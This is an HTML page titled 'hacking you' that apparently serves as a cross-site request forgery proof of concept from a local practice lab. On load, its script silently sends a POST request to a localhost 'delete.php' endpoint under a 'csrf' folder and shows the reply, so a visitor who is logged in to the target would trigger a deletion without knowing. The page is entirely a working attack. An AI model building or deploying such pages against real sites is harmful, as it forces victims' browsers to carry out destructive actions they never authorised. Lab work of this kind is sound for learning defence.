<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>hacking you</title>
</head>
<body>
    <div id="div"></div>
</body>
</html>
<script src="../../js/jquery.min.js"></script>

<script>
    $.ajax({
        url:'http://localhost/sql_inject/csrf/delete.php/',
        type:'POST',
        success:function(data){
            $('#div').html(data);
        }
    })
</script>
